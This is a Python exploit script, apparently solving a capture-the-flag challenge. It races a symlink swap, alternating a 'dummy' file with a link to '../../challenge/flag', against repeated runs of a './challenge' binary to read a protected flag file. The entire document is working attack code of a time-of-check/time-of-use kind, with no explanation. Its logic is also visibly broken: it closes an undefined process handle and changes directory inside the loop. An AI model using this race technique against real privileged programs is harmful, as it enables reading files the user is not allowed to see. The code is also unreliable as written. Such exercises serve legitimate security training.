#! /usr/bin/python3
import os 
from pwn import *
from subprocess import call

def step1():
    os.unlink("dummy")
    os.close(os.open("dummy", os.O_CREAT))
def step2():
    os.unlink("dummy")
    os.symlink("../../challenge/flag", "dummy")

if __name__ == "__main__":

    attempts = 0
    if os.fork() == 0:
        forkPID = os.getpid()
        os.close(os.open("dummy", os.O_CREAT))
        while True:
            step1()
            step2()

    else:
        while True:
            attempts += 1 
            os.chdir("../../challenge/")
            call(["./challenge", "dummy"])
            # p = process(["challenge", "dummy"], level="CRITICAL")
            # result = (p.readall().decode())
            # if "Ssof" in result:
            #     log.success(result)
            #     log.info(f"Took {attempts} attempts")
            #     break
            p.close()
